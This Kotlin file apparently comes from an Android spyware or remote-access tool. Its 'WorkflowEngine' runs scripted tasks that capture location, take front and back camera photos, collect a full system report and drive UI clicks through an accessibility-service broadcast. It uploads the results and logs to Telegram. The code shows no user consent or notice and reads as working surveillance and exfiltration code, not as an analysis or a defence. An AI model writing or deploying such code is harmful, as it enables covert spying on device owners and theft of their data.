package com.systemlinker.features

import android.content.Context
import android.content.Intent
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class WorkflowEngine(
    private val context: Context,
    private val uploader: TelegramUploader,
    private val systemHandler: SystemHandler,
    private val mediaHandler: MediaHandler
) {
    suspend fun executeWorkflow(workflowName: String) = withContext(Dispatchers.IO) {
        val wfFile = File(context.filesDir, "$workflowName.yml")
        if (!wfFile.exists()) {
            uploader.sendText("Workflow $workflowName not found.")
            return@withContext
        }

        val logFile = File(context.filesDir, "${workflowName}_status.txt")
        FileWriter(logFile, false).use { it.write("--- WORKFLOW LOG STARTED ---\n") }

        fun log(msg: String) {
            FileWriter(logFile, true).use { 
                it.write("[${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}] $msg\n") 
            }
        }

        log("Parsing workflow: $workflowName")
        val lines = wfFile.readLines()
        
        var currentTaskType = ""
        var currentCmd = ""
        var currentUiText = ""
        var currentUiTarget = ""
        var currentUiAction = ""
        var currentOffset = 1

        suspend fun executeCurrentTask() {
            if (currentTaskType == "command") {
                log("Executing Command: $currentCmd")
                when (currentCmd) {
                    "loc" -> log(systemHandler.getLocation())
                    "cam_front" -> mediaHandler.takePicture(true)?.let { uploader.sendFile(it, "photo", "WF Front Cam") }
                    "cam_back" -> mediaHandler.takePicture(false)?.let { uploader.sendFile(it, "photo", "WF Back Cam") }
                    "info" -> log(systemHandler.generateFullSystemReport().readText())
                }
            } else if (currentTaskType == "ui") {
                log("Executing UI Action: $currentUiAction on $currentUiTarget near '$currentUiText' (Offset $currentOffset)")
                val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                    setPackage(context.packageName)
                    putExtra("action", "workflow_ui")
                    putExtra("ui_text", currentUiText)
                    putExtra("ui_target", currentUiTarget)
                    putExtra("ui_action", currentUiAction)
                    putExtra("ui_offset", currentOffset)
                }
                context.sendBroadcast(intent)
                delay(2000) // Give UI time to react
            } else if (currentTaskType == "delay") {
                val delayTime = currentCmd.toLongOrNull() ?: 1000L
                log("Waiting for $delayTime ms")
                delay(delayTime)
            }
        }

        // Custom, extremely resilient YAML-like parser
        for (line in lines) {
            val trimmed = line.trim()
            if (trimmed.startsWith("- type:")) {
                if (currentTaskType.isNotEmpty()) executeCurrentTask() // Execute previous task
                currentTaskType = trimmed.substringAfter("type:").trim().replace("\"", "")
                // Reset vars
                currentCmd = ""; currentUiText = ""; currentUiTarget = ""; currentUiAction = "click"; currentOffset = 1
            } else if (trimmed.startsWith("cmd:")) {
                currentCmd = trimmed.substringAfter("cmd:").trim().replace("\"", "")
            } else if (trimmed.startsWith("text:")) {
                currentUiText = trimmed.substringAfter("text:").trim().replace("\"", "")
            } else if (trimmed.startsWith("target:")) {
                currentUiTarget = trimmed.substringAfter("target:").trim().replace("\"", "")
            } else if (trimmed.startsWith("action:")) {
                currentUiAction = trimmed.substringAfter("action:").trim().replace("\"", "")
            } else if (trimmed.startsWith("offset:")) {
                currentOffset = trimmed.substringAfter("offset:").trim().toIntOrNull() ?: 1
            }
        }
        if (currentTaskType.isNotEmpty()) executeCurrentTask() // Execute last task

        log("--- WORKFLOW FINISHED ---")
        uploader.sendDocument(logFile, "Workflow Completed: $workflowName")
    }

    suspend fun sendStatus(workflowName: String) {
        val logFile = File(context.filesDir, "${workflowName}_status.txt")
        if (logFile.exists()) {
            uploader.sendDocument(logFile, "Status of Workflow: $workflowName")
        } else {
            uploader.sendText("No active logs found for $workflowName.")
        }
    }
}